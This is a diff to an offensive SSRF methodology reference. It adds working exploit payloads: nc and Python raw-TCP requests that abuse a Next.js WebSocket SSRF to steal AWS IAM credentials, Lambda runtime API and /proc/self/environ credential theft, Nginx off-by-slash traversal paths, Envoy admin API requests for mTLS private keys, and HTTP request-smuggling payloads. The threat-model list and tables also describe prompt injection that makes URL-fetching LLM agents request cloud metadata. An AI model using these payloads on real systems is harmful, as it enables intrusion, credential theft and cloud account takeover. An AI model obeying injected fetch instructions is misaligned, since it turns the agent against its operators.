@@ -2146,14 +2146,261 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 
 ---
 
+## Next.js WebSocket Upgrade Handler SSRF — CVE-2026-44578
+
+**Root cause:** Next.js's HTTP/1.1 WebSocket upgrade handler (`packages/next/src/server/lib/router-server.ts`) forwarded raw TCP connections to the internal proxy engine before the routing lifecycle had fully completed. By sending a request with an absolute-form URI (e.g., `GET http://169.254.169.254/... HTTP/1.1`) plus `Upgrade: websocket` and `Connection: Upgrade` headers, an unauthenticated attacker coerces Next.js into proxying the connection directly to the specified URL — including metadata endpoints and internal services — with no authentication check.
+
+**Bypass logic:** Standard HTTP clients normalize absolute-form URIs away before transmission, so exploitation requires raw TCP (netcat, Python socket). The two `Upgrade: websocket` + `Connection: Upgrade` headers are mandatory; without them the code path is not triggered. Because this is GET-only, IMDSv2 (which requires PUT) is not exploitable — only IMDSv1.
+
+**Attack chain:** Single unauthenticated GET with absolute-form URI → Next.js WebSocket handler proxies to internal service → IMDSv1 credential theft → full AWS account pivot
+
+**Stack:** Self-hosted Next.js 13.4.13–15.5.15 and 16.0.0–16.2.4 running the built-in Node.js server (Vercel-hosted apps are NOT affected; patched in 15.5.16 and 16.2.5)
+
+**Payload:**
+```bash
+# Raw TCP — must bypass HTTP client normalization (use netcat or Python sockets)
+
+# Step 1: enumerate IAM role name
+printf 'GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n' | nc target.com 3000
+
+# Step 2: fetch full credentials (replace ROLE-NAME)
+printf 'GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n' | nc target.com 3000
+
+# Python socket (reliable control of raw bytes):
+import socket
+req = (b"GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n"
+       b"Host: target.com\r\n"
+       b"Upgrade: websocket\r\nConnection: Upgrade\r\n"
+       b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+       b"Sec-WebSocket-Version: 13\r\n\r\n")
+s = socket.create_connection(("target.com", 3000))
+s.send(req); print(s.recv(4096).decode())
+
+# Probe any internal service via absolute URI:
+# GET http://127.0.0.1:6379/ HTTP/1.1   → Redis
+# GET http://127.0.0.1:9200/ HTTP/1.1   → Elasticsearch
+# GET http://kubernetes.default.svc/api/v1/secrets HTTP/1.1  → K8s secrets
+
+# Verify affected version: npm ls next | grep next
+```
+
+**Source:** CVE-2026-44578, GHSA-c4j6-fc7j-m34r, SonicWall blog, hadrian.io, appsecmaster.net
+
+---
+
+## AWS Lambda Runtime API SSRF (localhost:9001)
+
+**Root cause:** AWS Lambda exposes a custom runtime API on `localhost:9001` within every function's execution environment. Unlike the EC2 IMDS (169.254.169.254), this endpoint is specific to Lambda and serves the current invocation's event data and response mechanism. SSRF inside a Lambda-hosted application can reach this endpoint to exfiltrate the live event payload — which typically contains HTTP headers, body, and `stageVariables` from API Gateway — plus the environment variables that hold the function's temporary IAM credentials.
+
+**Bypass logic:** SSRF filters blocking `169.254.169.254` (EC2 IMDS) rarely also block `localhost:9001`. The runtime API has no authentication — it is accessible by design to any code running within the same invocation context. Lambda functions almost universally store AWS credentials in environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`), which are also reachable via `file:///proc/self/environ` if file-scheme SSRF is available.
+
+**Attack chain:** SSRF in Lambda-hosted app → `localhost:9001/2018-06-01/runtime/invocation/next` → full event payload (API keys in headers, JWT tokens, user PII) + environment variable exfil (AWS temp creds, database URLs, third-party API keys) → cloud account pivot
+
+**Stack:** AWS Lambda (all runtimes: Python, Node.js, Java, Go, Ruby, .NET) when SSRF is possible from within the function's execution environment
+
+**Payload:**
+```
+# Fetch current invocation event data (the JSON payload passed to this Lambda invocation):
+http://localhost:9001/2018-06-01/runtime/invocation/next
+# Returns: full API Gateway event including HTTP headers, body, queryStringParameters,
+#          stageVariables (secrets stored there), requestContext with caller identity
+
+# Alternative forms:
+http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
+# Env var AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001 sets the exact host
+
+# Read IAM credentials + secrets from environment (if file:// available):
+file:///proc/self/environ
+# Contains: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN,
+#           AWS_LAMBDA_FUNCTION_NAME, AWS_REGION, plus all app-defined vars
+
+# Full credential exfil chain:
+# 1. SSRF → http://localhost:9001/2018-06-01/runtime/invocation/next
+#    → Event body: {"headers":{"Authorization":"Bearer eyJ..."},...}
+# 2. file:///proc/self/environ
+#    → AWS_ACCESS_KEY_ID=ASIA... + AWS_SECRET_ACCESS_KEY=... + AWS_SESSION_TOKEN=...
+# 3. export and pivot: aws sts get-caller-identity; aws s3 ls; aws secretsmanager list-secrets
+
+# Distinguish Lambda from EC2:
+# - EC2: 169.254.169.254 responds (IMDS)
+# - Lambda: 169.254.169.254 times out; localhost:9001 responds
+# - ECS Fargate: 169.254.170.2 responds (ECS metadata)
+```
+
+**Source:** RhinoSecurityLabs Cloud-Security-Research (AWS/lambda_ssrf), hackingthe.cloud "Steal IAM Credentials from Lambda", HackTricks Cloud SSRF
+
+---
+
+## Nginx Off-by-Slash proxy_pass Path Traversal SSRF
+
+**Root cause:** When Nginx's `location` block specifies a path WITHOUT a trailing slash (e.g., `location /api`) but `proxy_pass` targets a backend with a path (e.g., `proxy_pass http://backend/v1/`), Nginx does not strip the matched prefix before appending the rest of the request URI. A request to `/api../secret` becomes `/v1/../secret` at the backend, which normalizes to `/secret` — the attacker has escaped the `/v1/` path restriction and can reach any path on the backend. The same pattern applies to the `alias` directive (source code disclosure).
+
+**Bypass logic:** The missing trailing slash on the `location` directive is the root cause. `location /api` matches `/api../...` because `../` still starts with `/api`. Nginx does not normalize `..` before proxying — it passes the raw path to the backend where normalization to `/` or other paths occurs. Any path-based SSRF filter applied by Nginx's `location` rules is bypassed by prepending the unprotected prefix.
+
+**Attack chain:** Path-constrained SSRF → off-by-slash traversal → backend root or arbitrary path → internal admin endpoints, version info, unauthenticated management APIs
+
+**Stack:** Nginx + any backend (Python, Node, Java, Go) where `location` + `proxy_pass` is misconfigured without matching trailing slashes; common in microservice API gateways
+
+**Payload:**
+```nginx
+# Vulnerable config pattern:
+location /api {
+    proxy_pass http://internal-backend/v1/;
+}
+# FIX: both must have trailing slash: location /api/ { proxy_pass http://internal-backend/v1/; }
+
+# Exploit — traverse from /v1/ to /:
+GET /api../ HTTP/1.1
+Host: target.com
+# Nginx sends: GET / to http://internal-backend/v1/../ → normalized to http://internal-backend/
+
+# Access specific internal paths:
+GET /api../admin HTTP/1.1       # → http://internal-backend/admin
+GET /api../actuator HTTP/1.1    # → http://internal-backend/actuator (Spring Boot)
+GET /api../metrics HTTP/1.1     # → http://internal-backend/metrics
+
+# Alias directive — source code disclosure:
+# location /static {
+#     alias /var/www/static/;
+# }
+GET /static../ HTTP/1.1         # → reads /var/www/ directory listing
+GET /static../app.py HTTP/1.1   # → reads /var/www/app.py (app source code)
+GET /static../config.py HTTP/1.1 # → reads /var/www/config.py (secrets, DB URLs)
+
+# Discovery methodology:
+# 1. Identify all API path prefixes (e.g., /api, /v1, /static, /assets)
+# 2. Append ../ immediately after prefix: /api../, /v1../, /static../
+# 3. Compare response to normal /api/test — different status/body = traversal works
+# 4. Enumerate with common backend paths: /api../admin, /api../health, /api../env
+
+# Automated scan: gixy /etc/nginx/nginx.conf  (detects off-by-slash patterns)
+```
+
+**Source:** Orange Tsai "Breaking Parser Logic!" (BlackHat USA 2018), Detectify Nginx misconfigurations blog, gixy Nginx static analyzer
+
+---
+
+## Envoy Sidecar Admin API SSRF (Service Mesh Identity Theft — Port 15000)
+
+**Root cause:** Every Envoy proxy sidecar in an Istio (or Consul Connect / AWS App Mesh) service mesh exposes an unauthenticated admin API on `127.0.0.1:15000`. This API is bound to localhost to restrict external access — but SSRF in the application container inside the same pod provides full access to it. The admin API exposes the complete mesh service graph, all upstream cluster addresses, mTLS certificate chains (including private keys in memory), and Envoy's full runtime configuration. Stealing the pod's mTLS identity allows impersonating it in all cluster-internal traffic.
+
+**Bypass logic:** Application-layer SSRF to `localhost:15000` bypasses all Istio traffic policies and mTLS enforcement, because the admin API operates below the proxy's filtering layer. The endpoint is intentionally unauthenticated for operational use (health checks, debugging). Reading `/certs` exposes private key material held in memory for high-speed TLS — this is the path to full mesh identity theft.
+
+**Attack chain:** SSRF in app container → `localhost:15000/config_dump` dumps entire mesh topology (all internal service addresses) → `localhost:15000/certs` dumps mTLS certificates + private keys → attacker uses stolen K8s SA token + key material to impersonate the pod's SPIFFE identity → access any mesh service bypassing mTLS authorization policies
+
+**Stack:** Istio, Linkerd 2, AWS App Mesh, Consul Connect, any Envoy-based service mesh where application containers share a pod with an Envoy sidecar; Kubernetes 1.x+ with sidecar injection
+
+**Payload:**
+```
+# Enumerate Envoy admin endpoints from SSRF in the same pod:
+http://localhost:15000/                    # Admin landing page — lists all available endpoints
+http://localhost:15000/listeners           # All Envoy listener configs (ports + protocols)
+http://localhost:15000/clusters            # All upstream clusters = complete internal service graph
+http://localhost:15000/config_dump         # Full JSON config dump (entire mesh topology)
+http://localhost:15000/certs               # TLS certs including mTLS cert + private keys
+http://localhost:15000/server_info         # Envoy version + build info
+http://localhost:15000/stats               # Connection/request stats (operational intelligence)
+
+# Extract all upstream internal services from config_dump:
+http://localhost:15000/config_dump?resource=static_clusters
+
+# Identity theft chain:
+# 1. Read K8s service account token (from file:// SSRF or /proc/self/environ):
+file:///var/run/secrets/kubernetes.io/serviceaccount/token
+# 2. Dump pod's mTLS cert from Envoy (confirm pod's SPIFFE identity):
+http://localhost:15000/certs
+# 3. Use SA token to request new cert from Istio CA (istiod port 15012):
+#    curl -H "Authorization: Bearer $TOKEN" https://istiod.istio-system:15012/debug/registryz
+# 4. Own valid mTLS cert for this pod's SPIFFE ID
+# → impersonate the pod in all East-West mesh traffic → access any service
+
+# Destructive operations (confirm authorization before using):
+# POST http://localhost:15000/quitquitquit    → kills the Envoy sidecar (pod loses mesh routing)
+# POST http://localhost:15000/reset_counters  → resets all metrics
+
+# Alternate ports:
+http://localhost:15004/   # Alt Envoy admin in some Istio configurations
+http://localhost:9901/    # Envoy default admin port outside Istio mesh
+```
+
+**Source:** Instatunnel "Sidecar Siphon: Stealing Identities in Service Mesh Architectures", Envoy proxy admin interface documentation, Istio architecture security docs
+
+---
+
+## HTTP Request Smuggling → Backend SSRF (CL.TE / TE.CL Desync)
+
+**Root cause:** When a front-end proxy uses `Content-Length` to delimit request bodies (CL) but the back-end uses `Transfer-Encoding: chunked` (TE) — or vice versa — the two systems disagree on where one request ends and the next begins. An attacker crafts a request where the front-end sees one complete request, but the back-end sees that request plus a smuggled second request in what it perceives as the connection buffer. The smuggled request is processed by the back-end as a new, trusted request originating from the front-end — bypassing all WAF, IP allowlist, and host validation applied at the front-end layer. This enables SSRF against the back-end's own internal APIs.
+
+**Bypass logic:** All SSRF defenses (URL blocklists, host allowlists, authentication checks) are enforced at the front-end. The smuggled request never passes through the front-end security stack. The back-end processes it as a request from a trusted internal source. Internal-only admin paths, private API endpoints, and back-end management interfaces all become accessible.
+
+**Attack chain (CL.TE):** Smuggled request with `Host: localhost` → back-end processes it as a local admin request → access to `/admin`, internal management APIs, health endpoints with sensitive data → privilege escalation or information disclosure
+
+**Stack:** Any HTTP/1.1 setup with a proxy in front of a back-end: Nginx (CL) → Gunicorn/uWSGI/Node (TE), HAProxy → Apache, AWS ALB → EC2 app server, Cloudflare → origin — any combination where the two ends disagree on body framing
+
+**Payload:**
+```http
+# CL.TE desync — front-end uses Content-Length, back-end uses Transfer-Encoding:
+# Smuggle a GET to /admin only visible to back-end:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+X-Forwarded-For: 127.0.0.1
+Content-Length: 10
+
+x=1
+
+# TE.CL desync — front-end uses Transfer-Encoding, back-end uses Content-Length:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+60
+GET /internal/api/config HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 10
+
+x=1
+0
+
+
+# Bypass front-end host restriction — smuggle with Host: 127.0.0.1:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 73
+Transfer-Encoding: chunked
+
+0
+
+GET /secret-admin-path HTTP/1.1
+Host: 127.0.0.1
+x-ignore: x
+
+# Detection: timing-based confirmation (PortSwigger method)
+# Send CL.TE with body "X" (1 byte) as chunked — if back-end waits for more chunks → CL.TE confirmed
+# Timing: CL.TE test hangs for ~10s = vulnerable
+
+# Tools:
+# Burp Suite HTTP Request Smuggler extension (PortSwigger)
+# https://github.com/PortSwigger/http-request-smuggler
+# Burp Scanner "HTTP/1 desync" active scan check
+```
+
+**Source:** James Kettle "HTTP Desync Attacks: Request Smuggling Reborn" (PortSwigger 2019), "HTTP/1.1 Must Die: The Desync Endgame" (PortSwigger 2025), PortSwigger Web Security Academy request smuggling module
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Updated 2026-05-27.
+> Current patterns as of 2026-Q2. Updated 2026-05-30.
 
-**What's being exploited in the wild (2026-05-27):**
-> Current patterns as of 2026-Q2. Updated 2026-05-26.
-
-**What's being exploited in the wild (2026-05-26):**
+**What's being exploited in the wild (2026-05-30):**
 
 1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
    #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
@@ -2239,41 +2486,78 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
     protocol → `exec://` injection requires no credentials and produces instant RCE. Java
     RMI deserialization via CommonsCollections gadget chains remains viable in unpatched
     enterprise Java middleware.
-15. **Routing-based SSRF via Host/X-Forwarded-Host is under-tested** — Cloud-native
+
+19. **Routing-based SSRF via Host/X-Forwarded-Host is under-tested** — Cloud-native
     microservice stacks route requests by Host header at the load balancer layer. Fuzzing
     the Host header across internal subnet ranges (`192.168.0.§1§`) while watching OOB
     callbacks is now a standard first-pass technique. X-Forwarded-Host is accepted by many
     apps as a Host override, doubling the attack surface.
 
-16. **HTTP/2 pseudo-header SSRF bypasses HTTP/1.1 WAF rules** — Setting `:authority` to
+20. **HTTP/2 pseudo-header SSRF bypasses HTTP/1.1 WAF rules** — Setting `:authority` to
     an internal IP in HTTP/2 requests passes WAFs that only inspect HTTP/1.1 `Host` headers.
     The `:scheme` pseudo-header accepting arbitrary bytes has caused real SSRF in production
     reverse proxy deployments. Test any HTTP/2-capable endpoint with `:authority` set to
     your OOB collaborator.
 
-17. **CVE-2025-61882 (Oracle EBS) is the new Log4Shell for enterprise** — Pre-auth SSRF
+21. **CVE-2025-61882 (Oracle EBS) is the new Log4Shell for enterprise** — Pre-auth SSRF
     chained with CRLF injection and XSLT RCE (CVSS 9.8). Actively exploited by Cl0p
     ransomware since August 2025. Any Oracle EBS 12.2.3–12.2.14 instance is a critical
     target. SSRF in `/OA_HTML/configurator/UiServlet` with CRLF-assisted POST to BI
     Publisher's XSLT engine produces unauthenticated full RCE.
 
-18. **AI agent SSRF is the newest undefended surface** — LLM agents with URL-fetching
+22. **AI agent SSRF is the newest undefended surface** — LLM agents with URL-fetching
     tools are systematically vulnerable to prompt injection in fetched content. Unlike
     traditional SSRF where you bypass a URL filter, here you bypass the LLM's judgment.
     Attackers embed hidden instructions in support tickets, PDFs, or web pages the agent
     processes. Network-level controls (blocking 169.254.169.254 at the tool runner) are
     the only effective mitigation — the LLM cannot be trusted to refuse.
 
-19. **`strings.HasPrefix` / `startsWith` URL allowlist = automatic bypass** — Grafana
+23. **`strings.HasPrefix` / `startsWith` URL allowlist = automatic bypass** — Grafana
     CVE-2025-8341 demonstrated that prefix-based URL allowlisting is systematically
     bypassable with `ALLOWED@INTERNAL_HOST` payloads. Every custom webhook or import-URL
     validator should be audited for this pattern. Code reviewers: search for `HasPrefix`,
     `startsWith`, `str.startswith` applied to full URLs.
 
-20. **SSRF attack volume up 452% (2023–2024)** — Per SonicWall 2025 Cyber Threat Report,
+24. **SSRF attack volume up 452% (2023–2024)** — Per SonicWall 2025 Cyber Threat Report,
     AI-powered scanners are automating SSRF detection at scale. Bug bounty programs are
     seeing dramatically more SSRF submissions. Defenses are not keeping pace: IMDSv1 still
     deployed, allowlists still using prefix matching, Host headers still trusted by proxies.
+
+25. **CVE-2026-44578 (Next.js WebSocket SSRF) is the second Next.js critical in 12 months** —
+    Following CVE-2025-29927 (middleware auth bypass), Next.js's WebSocket upgrade handler
+    is now a proven SSRF vector (CVSS 8.6). A single unauthenticated raw TCP request with
+    an absolute-form URI + `Upgrade: websocket` headers reaches any internal service. IMDSv1
+    environments are immediately exploitable for credential theft. Versions 13.4.13+ through
+    15.5.15 and 16.0.0–16.2.4 are affected. Self-hosted Next.js is disproportionately
+    targeted in bug bounty programs using enterprise or startup frameworks.
+
+26. **Lambda Runtime API (localhost:9001) is the serverless equivalent of IMDS** — Lambda-
+    hosted applications don't expose 169.254.169.254, making SSRF filters there ineffective.
+    `localhost:9001` is universally present in all Lambda invocations and returns live event
+    data (including Authorization headers, API keys, user PII) plus is paired with environment
+    variables holding temporary IAM credentials. Always probe this endpoint when the SSRF
+    target is serverless.
+
+27. **Nginx off-by-slash proxy_pass traversal bypasses path-based SSRF confinement** —
+    Any Nginx config where `location /api` (no slash) proxies to `http://backend/v1/`
+    (with slash) is traversable via `/api../`. The backend sees `GET /` — escaping all path
+    restrictions. This is widespread in microservice gateway configs and is detectable by
+    comparing `/api/test` vs `/api../` response diffs. gixy detects it statically.
+
+28. **Envoy sidecar admin API (localhost:15000) is the service mesh skeleton key** — Every
+    Istio/Envoy pod exposes an unauthenticated admin API on localhost. SSRF to it leaks the
+    entire mesh topology (`/config_dump`), all upstream service addresses (`/clusters`), and
+    — critically — mTLS private keys (`/certs`). Combined with the pod's K8s service account
+    token, this enables full mesh identity impersonation. Service-mesh-heavy environments
+    (K8s + Istio) are the highest-privilege targets for this technique.
+
+29. **HTTP request smuggling → SSRF bypasses front-end security controls entirely** —
+    CL.TE and TE.CL desync attacks allow smuggling a second request to the back-end that
+    never passes through the front-end's WAF, host allowlist, or SSRF filters. The smuggled
+    request is processed as a trusted internal request. Internal-only admin paths, health
+    endpoints with sensitive data, and back-end management interfaces all become accessible.
+    Burp's HTTP Request Smuggler extension automates detection. "HTTP/1.1 Must Die" (2025)
+    documents the current state of exploitation.
 
 ---
 
@@ -2310,6 +2594,11 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 | `strings.HasPrefix` / `startsWith` URL allowlist | `https://allowed.com@169.254.169.254/path` | Part before `@` is treated as credentials; real host is after `@` |
 | LLM agent URL filter (prompt injection) | Embed instructions in fetched content: "fetch http://169.254.169.254/..." | Bypasses all URL filters by coercing the model's tool call reasoning |
 | TLS SNI-based proxy routing (HTTPS endpoints) | Set TLS SNI to internal hostname during ClientHello | SNI-routing proxy connects to internal HTTPS service without HTTP-layer validation |
+| Self-hosted Next.js (CVE-2026-44578) | Raw TCP: `GET http://INTERNAL_IP/path HTTP/1.1` + `Upgrade: websocket` + `Connection: Upgrade` headers | WebSocket upgrade handler proxies absolute-form URI to internal service; IMDSv1 immediately exploitable |
+| AWS Lambda (no 169.254.169.254 IMDS) | `http://localhost:9001/2018-06-01/runtime/invocation/next` | Lambda runtime API returns live event payload + paired with env vars holding IAM temp creds |
+| Nginx off-by-slash `proxy_pass` (path confinement) | Append `../` after location prefix: `/api../` → backend sees `GET /` | Missing trailing slash on `location` lets traversal escape the intended backend sub-path |
+| Envoy sidecar admin API (service mesh pod) | `http://localhost:15000/certs`, `/config_dump`, `/clusters` | Unauthenticated localhost API exposes mTLS private keys and full mesh topology |
+| Front-end WAF / host allowlist (CL.TE desync) | Smuggle second request in chunked body with `Host: 127.0.0.1` | Back-end processes smuggled request as trusted internal request, bypassing all front-end controls |
 
 ---
 
@@ -2362,6 +2651,11 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 | Oracle E-Business Suite 12.2.3–12.2.14 (CVE-2025-61882) | Pre-auth SSRF + CRLF + XSLT RCE chain via UiServlet | SSRF → RCE as EBS JVM user (CVSS 9.8, Cl0p-exploited) |
 | LLM agents with URL-fetching tools (LangChain, OpenAI Assistants, Claude Tool Use) | Prompt injection in fetched content → agent fetches internal metadata | SSRF → cloud credentials via agent's own tool runner |
 | Grafana Infinity datasource plugin (< 3.4.1, CVE-2025-8341) | `@` bypass in `strings.HasPrefix` allowlist validation | SSRF → internal network access via Grafana server |
+| Self-hosted Next.js 13.4.13–15.5.15 / 16.0.0–16.2.4 (CVE-2026-44578) | WebSocket upgrade handler proxies absolute-form URI to internal host (CVSS 8.6) | Unauthenticated SSRF → IMDSv1 → AWS credential theft in a single raw TCP request |
+| AWS Lambda runtime API at `localhost:9001` | Lambda runtime API accessible from within function; no auth; returns live event data | Event payload exfil (API keys, JWTs, user PII) + IAM temp creds from env vars → cloud account pivot |
+| Nginx acting as API gateway with off-by-slash `proxy_pass` config | Missing trailing slash enables `../` traversal past backend path restriction | Backend root access → internal admin endpoints, Spring Actuator, unauthenticated management APIs |
+| Envoy sidecar at `localhost:15000` (Istio / service mesh pods) | Unauthenticated admin API in every Istio-injected pod; exposes mesh topology + mTLS certs | Mesh identity theft — impersonate any pod in cluster → access all mesh-internal services |
+| HTTP back-end server behind CL.TE-vulnerable front-end proxy | CL.TE request smuggling — front-end passes SSRF filter, back-end processes smuggled internal request | Access to `/admin`, internal API paths, and management endpoints that front-end WAF blocks |
 
 ---
 
